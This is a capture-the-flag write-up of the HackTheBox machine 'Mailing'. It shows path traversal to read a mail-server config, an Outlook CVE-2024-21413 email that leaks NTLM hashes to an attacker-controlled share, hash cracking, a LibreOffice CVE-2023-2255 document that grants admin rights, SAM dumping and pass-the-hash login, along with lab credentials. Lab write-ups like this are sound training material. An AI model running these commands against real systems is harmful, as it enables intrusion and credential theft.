---
icon: windows
---

# Mailing - Easy

<figure><img src="../../.gitbook/assets/image (2900).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/mailing"><strong>Mailing</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.14 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-26 02:30 EST
Nmap scan report for 10.10.11.14
Host is up (0.038s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: IDLE SORT IMAP4rev1 NAMESPACE ACL completed OK IMAP4 RIGHTS=texkA0001 CAPABILITY CHILDREN QUOTA
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
587/tcp   open  smtp          hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IDLE SORT IMAP4rev1 NAMESPACE ACL completed OK IMAP4 RIGHTS=texkA0001 CAPABILITY CHILDREN QUOTA
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
56322/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-25T23:35:11
|_  start_date: N/A
|_clock-skew: -8h00m14s

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   57.49 ms 10.10.16.1
2   57.93 ms 10.10.11.14
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2878).png" alt=""><figcaption></figcaption></figure>

Couple of things the page presents us with some names and a download instructions button that is a redirect. It also tells us its powered by hMailServer!

<figure><img src="../../.gitbook/assets/image (2871).png" alt=""><figcaption></figcaption></figure>

The pdf contains instructions on how to setup a mail client on Windows and Ubuntu. There is an email address being leaked in one of the images&#x20;

<figure><img src="../../.gitbook/assets/image (2873).png" alt=""><figcaption></figcaption></figure>

maya@mailing.htb matches with the name above. Witch means that the other 2 users are likely ruy@mailing.htb and gregory@mailing.htb

#### Directory Busting

Does not provide us with anything we don't already know&#x20;

```bash
feroxbuster -u http://mailing.htb/ -x 404
```

<figure><img src="../../.gitbook/assets/image (2874).png" alt=""><figcaption></figcaption></figure>

#### Tech Stack

<figure><img src="../../.gitbook/assets/image (2875).png" alt=""><figcaption></figcaption></figure>

It’s Microsoft IIS server , running both ASP.NET and PHP.

### <mark style="color:$primary;">Path Traversal Exploit</mark>

<figure><img src="../../.gitbook/assets/image (2876).png" alt=""><figcaption></figcaption></figure>

We know now that it is vulnerable to Path Traversal. Let's try to figure out where the root directory is.

<figure><img src="../../.gitbook/assets/image (2877).png" alt=""><figcaption></figcaption></figure>

It's in a weird location.

It’s literally just appending the input path to a base path and calling `file_get_contents`. This is not a local file include \[LFI] vulnerability, as the contents fetched with `file_get_contents` are not executed as PHP code (which is why I’m able to read it as PHP source)

Next thing we can do now is look for the config file location of hMailServer

<figure><img src="../../.gitbook/assets/image (2879).png" alt=""><figcaption></figcaption></figure>

Managed to find the location on this forum!

```bash
../../Program+Files+(x86)\hMailServer\Bin\hMailServer.ini
```

<figure><img src="../../.gitbook/assets/image (2880).png" alt=""><figcaption></figcaption></figure>

There are two hashes stored as AdministratorPassword and Password. Crackstation reveals the passwords

<figure><img src="../../.gitbook/assets/image (2881).png" alt=""><figcaption></figcaption></figure>

```bash
administrator:homenetworkingadministrator
```

<figure><img src="../../.gitbook/assets/image (2882).png" alt=""><figcaption></figcaption></figure>

Unfortunately these creds do not work for the administrator user of the box

### <mark style="color:$primary;">CVE-2024-21413 hMailServer</mark>

Searching for hmailserver exploits I came across this&#x20;

<figure><img src="../../.gitbook/assets/image (2883).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2884).png" alt=""><figcaption></figcaption></figure>

There’s a solid [POC exploit](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability) by xaitax on GitHub, which just generates the HTML email and sends it. I’ll clone this repo to my host:

{% code overflow="wrap" %}
```bash
git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
```
{% endcode %}

To capture the authentication attempt, I’ll run Responder:

```bash
sudo responder -I tun0
```

I'll send the email to maya

{% code overflow="wrap" %}
```bash
python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.2\urgent\meeting" --subject "urgent"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2886).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2887).png" alt=""><figcaption></figcaption></figure>

Managed to capture Maya's hash

### <mark style="color:$primary;">Cracking NTLMv2 hash</mark>

```bash
hashcat maya-ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

```bash
hashcat maya-ntlmv2.hash /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (2888).png" alt=""><figcaption></figcaption></figure>

```bash
maya:m4y4ngs4ri
```

<figure><img src="../../.gitbook/assets/image (2889).png" alt=""><figcaption></figcaption></figure>

maya has winrm access!

<figure><img src="../../.gitbook/assets/image (2890).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (2894).png" alt=""><figcaption></figcaption></figure>

the localgroups seem to be in spanish!

<figure><img src="../../.gitbook/assets/image (2895).png" alt=""><figcaption></figcaption></figure>

maya has read and write access to the Important Documents share.&#x20;

However whenever I place a file in gets removed after 2 minutes or so. Which means that there is a scheduler running in the background.

<figure><img src="../../.gitbook/assets/image (2891).png" alt=""><figcaption></figcaption></figure>

There was not much that was interesting, so I started looking through the Program Files and I found LibreOffice this is not there by default on Windows machines.&#x20;

<figure><img src="../../.gitbook/assets/image (2892).png" alt=""><figcaption></figcaption></figure>

I found its version and started searching for possible exploits.

<figure><img src="../../.gitbook/assets/image (2893).png" alt=""><figcaption></figcaption></figure>

I came across an RCE POC exploit on github. I'll clone it to my machine and try it out

### <mark style="color:$primary;">CVE-2023-2255 LibreOffice v 7.4.0.1 RCE</mark>

```bash
git clone https://github.com/elweth-sec/CVE-2023-2255.git
```

This exploit will create a malicious `.odt` file that I will place in the Important Documents directory and execute it.

Uploading the file in maya's home directory and trying to run it does not seem to work! It did work when I placed it in the Importand Documents Directory and ran it

{% code overflow="wrap" %}
```bash
python3 CVE-2023-2255.py --cmd "net localgroup Administradores mailing\maya /add" --output 'exploit.odt'
```
{% endcode %}

```bash
smbclient \\\\mailing.htb\\"Important Documents" -U "maya%m4y4ngs4ri"
```

<figure><img src="../../.gitbook/assets/image (2896).png" alt=""><figcaption></figcaption></figure>

Now run the exploit, and maya should be in the local administrators group

<figure><img src="../../.gitbook/assets/image (2897).png" alt=""><figcaption></figcaption></figure>

Now that we are part of the local administrators group we can dump the sam!

```bash
netexec smb mailing.htb -u maya -p m4y4ngs4ri --sam
```

<figure><img src="../../.gitbook/assets/image (2898).png" alt=""><figcaption></figcaption></figure>

now we got the localadmin's hash we can login as him!&#x20;

{% code overflow="wrap" %}
```bash
evil-winrm -i mailing.htb -u localadmin -H 9aa582783780d1546d62f2d102daefae
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2899).png" alt=""><figcaption></figcaption></figure>
